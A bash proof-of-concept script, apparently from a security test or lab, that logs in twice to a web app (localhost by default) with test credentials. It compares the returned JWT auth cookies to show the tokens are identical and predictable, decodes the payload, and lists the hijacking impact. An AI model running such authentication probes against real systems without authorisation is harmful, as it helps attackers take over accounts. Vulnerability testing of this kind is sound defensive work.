#!/bin/bash

# POC: Predictable JWT Token Generation on Repeated Logins
# This script demonstrates that identical tokens are generated for the same user
# on repeated authentication attempts, making session tokens completely predictable

TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "POC: Predictable JWT Token Generation"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

echo "[*] Performing first login with test:test credentials..."
RESPONSE1=$(curl -s -i -X POST "$TARGET_URL/password/test" \
  -d "username=test&user_id=10032&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Extract token from Set-Cookie header
TOKEN1=$(echo "$RESPONSE1" | grep -i "Set-Cookie.*auth_token" | sed 's/.*auth_token=\([^;]*\).*/\1/' | head -1)

if [ -z "$TOKEN1" ]; then
    echo "[-] Failed to extract token from first login"
    echo "Response headers:"
    echo "$RESPONSE1" | head -20
    exit 1
fi

echo "[+] First login successful"
echo "[+] Auth Token 1: ${TOKEN1:0:60}..."
echo ""

# Small delay between logins
sleep 1

echo "[*] Performing second login with identical credentials..."
RESPONSE2=$(curl -s -i -X POST "$TARGET_URL/password/test" \
  -d "username=test&user_id=10032&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Extract token from second response
TOKEN2=$(echo "$RESPONSE2" | grep -i "Set-Cookie.*auth_token" | sed 's/.*auth_token=\([^;]*\).*/\1/' | head -1)

if [ -z "$TOKEN2" ]; then
    echo "[-] Failed to extract token from second login"
    echo "Response headers:"
    echo "$RESPONSE2" | head -20
    exit 1
fi

echo "[+] Second login successful"
echo "[+] Auth Token 2: ${TOKEN2:0:60}..."
echo ""

# Compare tokens
echo "[*] Comparing tokens..."
if [ "$TOKEN1" = "$TOKEN2" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Tokens are IDENTICAL!"
    echo ""
    echo "Full Token 1: $TOKEN1"
    echo "Full Token 2: $TOKEN2"
    echo ""
    
    # Decode JWT to show structure (base64 decode the payload)
    PAYLOAD=$(echo "$TOKEN1" | cut -d'.' -f2)
    # Add padding if needed
    PADDING=$((${#PAYLOAD} % 4))
    if [ $PADDING -ne 0 ]; then
        PAYLOAD="${PAYLOAD}$(printf '%.0s=' $(seq 1 $((4 - PADDING))))"
    fi
    DECODED=$(echo "$PAYLOAD" | base64 -d 2>/dev/null)
    
    echo "[+] JWT Payload (decoded): $DECODED"
    echo ""
    echo "[!] SECURITY IMPACT:"
    echo "    - Attackers can precompute valid tokens for known users"
    echo "    - Tokens are completely predictable and can be reused indefinitely"
    echo "    - Authentication bypass is possible without password knowledge"
    echo "    - Combined with user_id disclosure, any account can be hijacked"
    exit 0
else
    echo "[-] Tokens are different (as expected for secure implementation)"
    echo "Token 1: $TOKEN1"
    echo "Token 2: $TOKEN2"
    exit 1
fi